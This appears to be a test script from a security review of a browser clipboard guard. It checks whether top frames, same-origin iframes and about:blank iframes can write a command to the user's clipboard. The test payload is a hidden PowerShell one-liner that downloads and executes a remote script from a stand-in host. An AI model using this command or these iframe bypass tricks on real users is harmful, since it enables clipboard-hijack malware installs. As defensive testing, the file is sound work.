import { start } from "docs/review-2026-11-16/repros/guards-lens/harness.mjs";
const CMD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1')\"";
const page0 = `<!doctype html><body><button id=b>go</button><iframe id=early src="/child"></iframe><script>window.CMD=${JSON.stringify(CMD)}</script></body>`;
const { ctx, sw, port, base, close } = await start({ "/": page0, "/child": "<p>child</p>" }, { settings: { guardClipboard: false } });
const page = await ctx.newPage();
page.on("console", (m) => { if (!m.text().includes("404")) console.log("   console:", m.text()); });
await page.goto(base + "/");
await page.waitForTimeout(800);
async function attempt(name, fn) {
  await page.evaluate(() => navigator.clipboard.writeText("clean"));
  await page.evaluate(`document.getElementById('b').onclick = ${fn}; 0`);
  await page.click("#b");
  await page.waitForTimeout(800);
  const got = await page.evaluate(() => navigator.clipboard.readText());
  console.log(name.padEnd(50), got === CMD ? "written (flag off reached the frame)" : "BLOCKED (frame guard never got flags): " + got);
}
await attempt("top frame writeText (guard switched off)", `() => navigator.clipboard.writeText(CMD).catch(e=>console.log(e.name))`);
await attempt("same-origin /child frame writeText", `() => (()=>{const w=document.getElementById("early").contentWindow; w.focus(); return w;})().navigator.clipboard.writeText(CMD).catch(e=>console.log(e.name))`);
await attempt("about:blank frame, 300 ms later", `() => { const f=document.createElement('iframe'); document.body.appendChild(f); setTimeout(()=>(f.contentWindow.focus(),f.contentWindow).navigator.clipboard.writeText(CMD).catch(e=>console.log(e.name)), 300); }`);
await attempt("about:blank frame made at load, used later", `() => { if(!window.ff){window.ff=document.createElement('iframe');document.body.appendChild(ff);} setTimeout(()=>(ff.contentWindow.focus(),ff.contentWindow).navigator.clipboard.writeText(CMD).catch(e=>console.log(e.name)), 300); }`);
await close();
